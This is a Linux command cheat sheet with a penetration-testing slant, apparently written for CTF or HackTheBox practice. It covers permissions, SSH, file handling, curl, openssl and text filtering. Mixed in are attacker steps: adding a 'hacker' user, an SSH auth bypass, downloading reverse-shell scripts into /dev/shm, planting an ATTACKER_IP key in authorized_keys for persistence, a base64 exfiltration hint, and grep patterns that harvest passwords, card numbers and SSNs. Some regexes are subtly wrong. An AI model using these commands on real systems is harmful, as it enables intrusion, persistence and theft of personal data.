# Linux basics

## Privileges - chmod, chown

{% code overflow="wrap" %}
```
u: users
g: group
o: others

r: read
w: write
x: execute

4: read
2: write
1: exec

3: write and write
5: read and exec
6: read and write

7: read, write and exec
```
{% endcode %}

{% code overflow="wrap" %}
```bash
## Chmod
chmod {who}:{what} {file}
chmod  u+x file   # User add Executable permission
chmod +x file # all exec
chmod 777 file   # All permissions granted = ugo+rwx
chmod 600 file    # Usually ir_rsa keys

## Chown
chown name filename
chown name foldername
chown -R name:filename /home/name/directoryname

#Add new user
useradd hacker:hacker_group
useradd -p 'openssl passwd -1 <Password>' hacker
```
{% endcode %}

## Common Bash

### SSH

{% code overflow="wrap" %}
```bash
# Connection
ssh {user}@{domain} -p {port}
ssh -i id_rsa {user}@{domain} -p {port}

## Bypass SSH auth - bash misconfiguration vuln
# Spawn Bash shell by append a command
ssh {user}@{domain} -p {port} bash

# Spawn interactive Shell
ssh {user}@{domain} -p {port} bash --norc

# ssh-keyscan, help to find if 2 ssh ports are from the same host comparing keys
ssh-keyscan 10.10.10.101
```
{% endcode %}

### Decompress, curl, openssl, etc

<pre class="language-bash" data-overflow="wrap"><code class="lang-bash"># Truncate and write: >
# Append: >>
<strong>
</strong># file descriptors - standard input, output(1), and error (2)
# Filter to /dev/null
2>/dev/null    #redirects standard error (2) to /dev/null
command >> /dev/null 2>&#x26;1  #redirects standard error (2) to standard output (1), then to /dev/null. Merges output from stream 2 with stream 1.
# '&#x26;' means whatever follows is a file descriptor, not a filename

## Echo
echo "Hi, this is a hack3r"
echo "Hi, this is a hack3r" > file.txt
echo -n -e   #Echo without new line and Hex

#Decompress
sudo apt-get install xz-utils; unxz file.xz
7z -x file.7z
tar -xvzf /path/to/yourfile.tgz
tar -xvjf /path/to/yourfile.tbz
bzip2 -d /path/to/yourfile.bz2
tar jxf file.tar.bz2
gunzip /path/to/yourfile.gz
unzip file.zip
# List files inside zip
7z l file.zip

# Temp directory for work
mktemp -d
>tmp/tmp/whatever
cd {tmp/tmp/whatever}

#Clipboard
xclip -sel c &#x3C; cat file.txt

#HTTP servers
python -m SimpleHTTPServer 80
python3 -m http.server
ruby -rwebrick -e "WEBrick::HTTPServer.new(:Port => 80, :DocumentRoot => Dir.pwd).start"
php -S $ip:80

## Curl - Wget
#json data
curl --header "Content-Type: application/json" --request POST --data '{"password":"password", "username":"admin"}' http://host:3000/endpoint
#Auth via JWT
curl -X GET -H 'Authorization: Bearer &#x3C;JWT>' http://host:3000/endpoint
<strong>
</strong>#Download in RAM
wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
<strong>
</strong>#Add public key to authorized keys
curl https://ATTACKER_IP/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys
<strong>
</strong>#Count
wc -l &#x3C;file> #Lines
wc -c #Chars

#Base64
base64 file
base64 -d file

<strong>#Exfiltration using Base64
</strong>base64 -w 0 file
#Get HexDump without new lines
xxd -p boot12.bin | tr -d '\n'

#Files used by network processes
lsof #Open files belonging to any process
lsof -p 3 #Open files used by the process
lsof -i #Files used by networks processes
lsof -i 4 #Files used by network IPv4 processes
lsof -i 6 #Files used by network IPv6 processes
lsof -i 4 -a -p 1234 #List all open IPV4 network files in use by the process 1234
lsof +D /lib #Processes using files inside the indicated dir
lsof -i :80 #Files uses by networks processes
fuser -nv tcp 80

#Send Email
sendEmail -t to@email.com -f from@email.com -s 192.168.8.131 -u Subject -a file.pdf #You will be prompted for the content

#DD copy hex bin file without first X (28) bytes
dd if=file.bin bs=28 skip=1 of=blob

#Mount .vhd files (virtual hard drive)
sudo apt-get install libguestfs-tools
guestmount --add NAME.vhd --inspector --ro /mnt/vhd #For read-only, create first /mnt/vhd

# Openssl
openssl s_client -connect 10.10.10.127:443 #Get the certificate from a server
openssl x509 -in ca.cert.pem -text #Read certificate
openssl genrsa -out newuser.key 2048 #Create new RSA2048 key
openssl req -new -key newuser.key -out newuser.csr #Generate certificate from a private key. Recommended to set the "Organizatoin Name"(Fortune) and the "Common Name" (newuser@fortune.htb)
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Create certificate
openssl x509 -req -in newuser.csr -CA intermediate.cert.pem -CAkey intermediate.key.pem -CAcreateserial -out newuser.pem -days 1024 -sha256 #Create a signed certificate
openssl pkcs12 -export -out newuser.pfx -inkey newuser.key -in newuser.pem #Create from the signed certificate the pkcs12 certificate format (firefox)
# If you only needs to create a client certificate from a Ca certificate and the CA key, you can do it using:
openssl pkcs12 -export -in ca.cert.pem -inkey ca.key.pem -out client.p12
# Decrypt ssh key
openssl rsa -in key.ssh.enc -out key.ssh
#Decrypt
openssl enc -aes256 -k &#x3C;KEY> -d -in backup.tgz.enc -out b.tgz

#Reconfigure timezone
sudo dpkg-reconfigure tzdata

#Search from which package is a binary
apt-file search /usr/bin/file #Needed: apt-get install apt-file

#Protobuf decode https://www.ezequiel.tech/2020/08/leaking-google-cloud-projects.html
echo "CIKUmMesGw==" | base64 -d | protoc --decode_raw

#Set not removable bit
sudo chattr +i file.txt
sudo chattr -i file.txt #Remove the bit so you can delete it

</code></pre>

### Grep & filters (awk, sed...)

{% code overflow="wrap" %}
```bash
## Grep
grep "string"
grep -v "string"
grep -E "string1|string2"
grep "^string"    # begin with string
grep "^string$" -n  # begin with "string" and finish with "g"; '-n' show line number
grep -E "[1-65535]"  #filter by range of numbers
grep -E "^[1-65535]"  #filter that begin eith range of numbers (ej. nmap ports)

## Awk
awk 'NF{print NF}'   #magic filter that shows last argument
awk 'NR==999'        #show line 999
awk '/string/'
awk '{print $1}'  #print first argument
awk '{print $3" "$4" "$5" "$6}'    #print multiple arguments

## Cut innecesary spaces and caracters
# Sed arguments: 's/a/b/g'; replace a with b in whole line (g)
sed -i 's/OLD/NEW/g' path/file

sed 's/ //'    #removes all spaces and replaces them with nothing.
sed 's/^ *//'   #remove anything that begins with a space and follows anything and replace it with nothing
sed '/^\s*$/d'  #remove anything that begins with a space and follows anything and ends with an empty space
sed 's/=//g'    #removes all '=' and replaces them with nothing in the whole line
sed 's/ /\n/g'    # replace spaces with line/line breaks

#tr
tr '[a-z]' '[A-z]'   # Replace lowercase from a to z with uppercase from A-Z
tr ' ' '\n'          # replace spaces with line/line breaks

tail -n1
# tail: show the last line according to the -n flag.

#Sort
cat file | sort | uniq #Sort and delete duplicates
sort -nr #Sort by number and then reverse
uniq -c1  # filter by unique

# Xargs: Execute a command in parallel on a previously executed output.
{command} | xargs cat
find . -name .hidden | xargs cat  #Find .hidden file and apply a cat
find . -name -file* | xargs file   #Find file starting with file then anything and apply a cat
xargs cat | sed 's/^ *//'  # Can apply anothers filters to xargs output.
```
{% endcode %}

### Magic Greps

{% code overflow="wrap" %}
```bash
#Extract emails from file
grep -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b" file.txt

#Extract valid IP addresses
grep -E -o "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)" file.txt

#Extract passwords
grep -i "pwd\|passw" file.txt

#Extract users
grep -i "user\|invalid\|authentication\|login" file.txt

# Extract hashes
#Extract md5 hashes ({32}), sha1 ({40}), sha256({64}), sha512({128})
egrep -oE '(^|[^a-fA-F0-9])[a-fA-F0-9]{32}([^a-fA-F0-9]|$)' *.txt | egrep -o '[a-fA-F0-9]{32}' > md5-hashes.txt
#Extract valid MySQL-Old hashes
grep -e "[0-7][0-9a-f]{7}[0-7][0-9a-f]{7}" *.txt > mysql-old-hashes.txt
#Extract blowfish hashes
grep -e "$2a\$\08\$(.){75}" *.txt > blowfish-hashes.txt
#Extract Joomla hashes
egrep -o "([0-9a-zA-Z]{32}):(w{16,32})" *.txt > joomla.txt
#Extract VBulletin hashes
egrep -o "([0-9a-zA-Z]{32}):(S{3,32})" *.txt > vbulletin.txt
#Extraxt phpBB3-MD5
egrep -o '$H$S{31}' *.txt > phpBB3-md5.txt
#Extract Wordpress-MD5
egrep -o '$P$S{31}' *.txt > wordpress-md5.txt
#Extract Drupal 7
egrep -o '$S$S{52}' *.txt > drupal-7.txt
#Extract old Unix-md5
egrep -o '$1$w{8}S{22}' *.txt > md5-unix-old.txt
#Extract md5-apr1
egrep -o '$apr1$w{8}S{22}' *.txt > md5-apr1.txt
#Extract sha512crypt, SHA512(Unix)
egrep -o '$6$w{8}S{86}' *.txt > sha512crypt.txt

#Extract e-mails from text files
grep -E -o "\b[a-zA-Z0-9.#?$*_-]+@[a-zA-Z0-9.#?$*_-]+.[a-zA-Z0-9.-]+\b" *.txt > e-mails.txt

#Extract HTTP URLs from text files
grep http | grep -shoP 'http.*?[" >]' *.txt > http-urls.txt
#For extracting HTTPS, FTP and other URL format use
grep -E '(((https|ftp|gopher)|mailto)[.:][^ >"	]*|www.[-a-z0-9.]+)[^ .,;	>">):]' *.txt > urls.txt
#Note: if grep returns "Binary file (standard input) matches" use the following approaches # tr '[\000-\011\013-\037177-377]' '.' < *.log | grep -E "Your_Regex" OR # cat -v *.log | egrep -o "Your_Regex"

#Extract Floating point numbers
grep -E -o "^[-+]?[0-9]*.?[0-9]+([eE][-+]?[0-9]+)?$" *.txt > floats.txt

# Extract credit card data
#Visa
grep -E -o "4[0-9]{3}[ -]?[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}" *.txt > visa.txt
#MasterCard
grep -E -o "5[0-9]{3}[ -]?[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}" *.txt > mastercard.txt
#American Express
grep -E -o "\b3[47][0-9]{13}\b" *.txt > american-express.txt
#Diners Club
grep -E -o "\b3(?:0[0-5]|[68][0-9])[0-9]{11}\b" *.txt > diners.txt
#Discover
grep -E -o "6011[ -]?[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}" *.txt > discover.txt
#JCB
grep -E -o "\b(?:2131|1800|35d{3})d{11}\b" *.txt > jcb.txt
#AMEX
grep -E -o "3[47][0-9]{2}[ -]?[0-9]{6}[ -]?[0-9]{5}" *.txt > amex.txt

# Extract IDs
#Extract Social Security Number (SSN)
grep -E -o "[0-9]{3}[ -]?[0-9]{2}[ -]?[0-9]{4}" *.txt > ssn.txt
#Extract Indiana Driver License Number
grep -E -o "[0-9]{4}[ -]?[0-9]{2}[ -]?[0-9]{4}" *.txt > indiana-dln.txt
#Extract US Passport Cards
grep -E -o "C0[0-9]{7}" *.txt > us-pass-card.txt
#Extract US Passport Number
grep -E -o "[23][0-9]{8}" *.txt > us-pass-num.txt
#Extract US Phone Numberss
grep -Po 'd{3}[s-_]?d{3}[s-_]?d{4}' *.txt > us-phones.txt
#Extract ISBN Numbers
egrep -a -o "\bISBN(?:-1[03])?:? (?=[0-9X]{10}$|(?=(?:[0-9]+[- ]){3})[- 0-9X]{13}$|97[89][0-9]{10}$|(?=(?:[0-9]+[- ]){4})[- 0-9]{17}$)(?:97[89][- ]?)?[0-9]{1,5}[- ]?[0-9]+[- ]?[0-9]+[- ]?[0-9X]\b" *.txt > isbn.txt
```
{% endcode %}
